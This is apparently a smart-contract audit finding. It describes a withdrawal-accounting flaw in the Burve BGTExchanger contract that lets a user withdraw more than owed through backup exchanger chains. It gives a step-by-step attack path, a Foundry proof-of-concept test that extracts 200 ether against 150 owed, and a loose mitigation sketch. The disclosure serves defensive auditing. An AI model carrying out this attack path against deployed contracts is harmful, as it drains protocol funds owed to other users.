# BGTExchanger withdrawn accounting vulnerability leads to double-withdrawals

### Summary

The flawed withdrawal accounting mechanism in BGTExchanger contract will cause potential loss of protocol funds or inaccessible user balances as users can withdraw more tokens than they're entitled to through different backup paths, or find their rightful tokens inaccessible due to conflicting withdrawal records.

### Root Cause

The vulnerability exists in two critical functions of the BGTExchanger contract:

1. In [`withdraw()`](https://github.com/sherlock-audit/2025-04-burve/blob/main/Burve/src/integrations/BGTExchange/BGTExchanger.sol#L81-L87) , withdrawals are only tracked at the current exchanger level:
```solidity
function withdraw(address recipient, uint256 bgtAmount) external {
    uint256 _owed = getOwed(msg.sender);
    if (bgtAmount == 0) return;
    if (_owed < bgtAmount) revert InsufficientOwed();
    withdrawn[msg.sender] += bgtAmount; // Only records at this exchanger
    TransferHelper.safeTransfer(bgtToken, recipient, bgtAmount);
}
```

2. In [`getOwed()`](https://github.com/sherlock-audit/2025-04-burve/blob/main/Burve/src/integrations/BGTExchange/BGTExchanger.sol#L72-L78), the calculation aggregates owed amounts across the backup chain but only subtracts withdrawals from the current exchanger:
```solidity
function getOwed(address caller) public view returns (uint256 _owed) {
    _owed = owed[caller];
    if (address(backupEx) != address(0)) {
        _owed += backupEx.getOwed(caller); // Gets owed from backup
    }
    _owed -= withdrawn[caller]; // Only subtracts withdrawals from this exchanger
}
```

This design fundamentally breaks the accounting system when users withdraw through different paths in the backup chain, as there's no mechanism to track or coordinate withdrawals across multiple exchangers.

### Internal Pre-conditions

1. Admin needs to set up a backup chain of at least two BGTExchangers with `setBackup()` function
2. At least one user needs to have owed balances across multiple exchangers in the backup chain
3. The exchangers need to have sufficient token balances to allow withdrawals

### External Pre-conditions

none

### Attack Path

1. **Admin sets up a linear backup chain of three exchangers: C → B → A**
2. **User has a total of 150 tokens owed across the three exchangers (50 in each)**
3. **User withdraws 70 tokens via exchanger B (50 from B + 20 from A via B's backup)**
4. **User withdraws 80 tokens via exchanger C (50 from C + 30 from what C thinks is still owed by B)**
5. **Admin deploys a new exchanger D that directly points to A as backup**
6. **User queries getOwed() in exchanger D and discovers they can still withdraw 50 tokens from A (the full amount), even though they've already withdrawn 20 tokens from A through B**
7. **User withdraws the additional 50 tokens, resulting in a total withdrawal of 200 tokens - 50 more than they were entitled to**

### Impact

The protocol could suffer a significant loss of tokens due to users being able to withdraw more tokens than they're entitled to. The magnitude depends on the amount of tokens owed across the backup chain, but could potentially be up to 100% of tokens owed through specific paths in the backup system.
The vulnerability is particularly concerning because it becomes more severe as the protocol grows and adds more exchangers or migrates between exchanger implementations. This creates complex backup chains where the accounting issues compound.

### PoC

Add this in BGTExchanger.t.sol
```solidity
 function testWithdrawnAccountingLinearChain() public {
        // Start as owner to set up exchangers
        vm.startPrank(owner);

        // Create three exchangers to form a linear chain
        ExposedBGTExchanger exchangerA = new ExposedBGTExchanger(address(ibgt));
        ExposedBGTExchanger exchangerB = new ExposedBGTExchanger(address(ibgt));
        ExposedBGTExchanger exchangerC = new ExposedBGTExchanger(address(ibgt));

        // Setup owed amounts in each exchanger
        // Alice is owed 50 in A, 50 in B, and 50 in C = 150 total
        exchangerA.setOwed(alice, 50 ether);
        exchangerB.setOwed(alice, 50 ether);
        exchangerC.setOwed(alice, 50 ether);

        // Create LINEAR backup chain: C → B → A (no skips)
        exchangerB.setBackup(address(exchangerA));
        exchangerC.setBackup(address(exchangerB));

        // Fund each exchanger to allow withdrawals
        deal(address(ibgt), address(exchangerA), 1000 ether);
        deal(address(ibgt), address(exchangerB), 1000 ether);
        deal(address(ibgt), address(exchangerC), 1000 ether);

        exchangerA.setBgtBalance(1000 ether);
        exchangerB.setBgtBalance(1000 ether);
        exchangerC.setBgtBalance(1000 ether);

        vm.stopPrank();

        // STEP 1: First, let's verify the total amount Alice is owed through C
        // Expected: 50 (from C) + 50 (from B) + 50 (from A) = 150 ether
        uint256 initialOwed = exchangerC.getOwed(alice);
        assertEq(
            initialOwed,
            150 ether,
            "Initial amount owed should be 150 ether"
        );

        // STEP 2: Alice withdraws through exchanger B directly (skipping C)
        vm.startPrank(alice);

        // Alice withdraws 70 ether via exchanger B
        // This covers B's 50 + 20 from A through B's backup
        exchangerB.withdraw(alice, 70 ether);

        // Check B's withdrawn mapping for Alice
        uint256 bWithdrawn = exchangerB.withdrawn(alice);
        assertEq(bWithdrawn, 70 ether, "B should record 70 ether withdrawn");

        vm.stopPrank();

        // STEP 3: Now let's check what C thinks Alice is still owed
        uint256 cOwed = exchangerC.getOwed(alice);

        // C should report: 50 (from C) + [50 (from B) + 50 (from A) - 70 (B's withdrawn)] = 80 ether
        assertEq(cOwed, 80 ether, "C should report 80 ether still owed");

        // STEP 4: Alice tries to withdraw the remaining amount through C
        vm.startPrank(alice);
        exchangerC.withdraw(alice, 80 ether);

        // Check C's withdrawn mapping for Alice
        uint256 cWithdrawn = exchangerC.withdrawn(alice);
        assertEq(cWithdrawn, 80 ether, "C should record 80 ether withdrawn");

        // STEP 5: Now the problem appears when we calculate how much Alice actually withdrew
        uint256 totalWithdrawn = bWithdrawn + cWithdrawn;

        // Alice has withdrawn 70 (via B) + 80 (via C) = 150 ether in total
        assertEq(
            totalWithdrawn,
            150 ether,
            "Total withdrawn should be 150 ether"
        );

        // STEP 6: Let's check what each exchanger has left for Alice

        // A should show: 50 (original) - 20 (via B) - 30 (via C→B) = 0 left
        // But the calculation doesn't work that way due to the local tracking

        // Let's create a new exchanger that directly points to A
        vm.stopPrank();
        vm.startPrank(owner);
        ExposedBGTExchanger exchangerD = new ExposedBGTExchanger(address(ibgt));
        exchangerD.setBackup(address(exchangerA));
        deal(address(ibgt), address(exchangerD), 1000 ether);
        exchangerD.setBgtBalance(1000 ether);
        vm.stopPrank();

        // Now check what D thinks Alice is owed (should be 0 if accounting were perfect)
        uint256 dOwed = exchangerD.getOwed(alice);

        // But due to the accounting issue, D sees that Alice is still owed some ether from A
        // This allows Alice to potentially withdraw more than she should be able to
        assertGt(
            dOwed,
            0,
            "D incorrectly reports Alice is still owed ether from A"
        );

        // For complete verification, we check the exact amount D thinks Alice is owed
        assertEq(
            dOwed,
            50 ether,
            "D specifically reports Alice is still owed 50 ether from A (the full amount!)"
        );

        // STEP 7: Alice can now withdraw this "extra" amount that she shouldn't have access to
        vm.startPrank(alice);
        exchangerD.withdraw(alice, dOwed);

        // This means Alice has now withdrawn more than she was owed!
        uint256 finalTotalWithdrawn = bWithdrawn +
            cWithdrawn +
            exchangerD.withdrawn(alice);
        assertEq(
            finalTotalWithdrawn,
            200 ether,
            "Alice has withdrawn 200 ether when she was only owed 150 ether!"
        );

        vm.stopPrank();
    }
```

### Mitigation

**Global Withdrawal Tracking**: Implement a global withdrawal tracking system that maintains withdrawal records across all exchangers, not just at the level where the withdrawal was initiated:

```solidity
        // Add a global mapping in a shared location accessible by all exchangers
        mapping(address => uint256) public globalWithdrawn;

        // Update the withdraw function to use global tracking
        function withdraw(address to, uint256 amount) external {
            uint256 owed = getOwed(msg.sender);
            if (owed < amount) revert InsufficientOwed();
            
            // Transfer tokens
            TransferHelper.safeTransfer(bgtToken, to, amount);
            
            // Update global withdrawn amount instead of local
            globalWithdrawn[msg.sender] += amount;
        }

        // Update getOwed to use the global withdrawn value
        function getOwed(address caller) public view returns (uint256) {
            uint256 total = owed[caller];
            if (address(backupEx) != address(0)) {
                total += IBGTExchanger(backupEx).getOwed(caller);
            }
            return total > globalWithdrawn[caller] ? total - globalWithdrawn[caller] : 0;
        }
```
